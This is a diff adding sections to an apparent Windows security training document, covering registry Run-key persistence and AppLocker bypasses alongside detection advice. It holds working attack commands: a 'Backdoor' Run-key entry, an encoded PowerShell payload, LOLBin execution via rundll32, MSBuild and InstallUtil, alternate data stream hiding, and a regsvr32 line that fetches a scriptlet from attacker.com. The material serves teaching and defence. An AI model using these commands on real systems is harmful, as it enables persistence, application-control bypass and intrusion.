@@ -1520,3 +1520,79 @@ Get-Acl C:\path\to\file | Format-List
 4. **Anomaly detection** — Baseline normal behavior
 5. **Threat hunting** — Proactive searching voor IOCs
    ::
+
+## RUNonce
+
+### Persistence via Run Keys
+
+::warning
+**Offensive Persistence:**
+Run keys zijn een **klassieke persistence mechanism**:
+
+```powershell
+# Add malicious entry to HKCU Run key (no admin required)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe"
+
+# Add to HKLM Run key (requires admin)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /t REG_SZ /d "powershell.exe -enc <base64_payload>"
+```
+
+**Defensive Detection:**
+
+- Monitor **registry modifications** in Run/RunOnce keys (Sysmon Event ID 13)
+- Alert op **unsigned binaries** in Run keys
+- Audit **HKLM Run key changes** (require admin privileges — suspicious!)
+- Use **Autoruns** (Sysinternals) voor comprehensive autostart location auditing
+  ::
+
+## Applocker
+
+### AppLocker Bypass Techniques (Educational)
+
+::warning
+**Common AppLocker Bypasses:**
+
+**1. Trusted Paths Abuse:**
+
+```
+C:\Windows\System32\*
+C:\Windows\SysWOW64\*
+C:\Program Files\*
+```
+
+Als deze paths zijn whitelisted, place payload daar (requires write permissions).
+
+**2. LOLBINs (Living Off the Land Binaries):**
+
+```powershell
+# Rundll32.exe
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe")
+
+# Regsvr32.exe (Squiblydoo)
+regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+
+# MSBuild.exe
+msbuild.exe C:\path\to\malicious.csproj
+
+# InstallUtil.exe
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\payload.exe
+```
+
+**3. DLL Search Order Hijacking:**
+Als DLL rules niet enforced zijn, plaats malicious DLL in application directory.
+
+**4. Alternate Data Streams (ADS):**
+
+```powershell
+type payload.exe > legitimate.txt:hidden.exe
+wmic process call create "C:\path\to\legitimate.txt:hidden.exe"
+```
+
+**Defensive Countermeasures:**
+
+- **DLL rules** — Always enforce DLL rules (performance impact!)
+- **Script rules** — Block PowerShell, cmd.exe, wscript.exe voor standard users
+- **Path rules** — Be specific, avoid wildcards
+- **Regular audits** — Review AppLocker logs and blocked attempts
+- **Least privilege** — Limit write access to whitelisted paths
+  ::
